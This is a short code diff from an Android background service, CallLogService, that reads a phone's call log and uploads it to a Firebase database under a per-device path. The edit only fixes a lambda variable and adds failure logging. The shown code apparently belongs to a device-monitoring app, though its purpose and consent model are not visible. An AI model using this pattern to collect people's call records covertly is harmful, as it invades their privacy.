@@ -88,8 +88,10 @@ public class CallLogService extends Service {
             }
             cursor.close();
 
+            final int finalCount = count;
             dbRef.child("devices").child(deviceId).child("callLog").setValue(calls)
-                    .addOnSuccessListener(aVoid -> Log.d(TAG, "Calls sent: " + count));
+                    .addOnSuccessListener(aVoid -> Log.d(TAG, "Calls sent: " + finalCount))
+                    .addOnFailureListener(e -> Log.e(TAG, "Failed: " + e.getMessage()));
         } catch (Exception e) {
             Log.e(TAG, "Error: " + e.getMessage());
         }
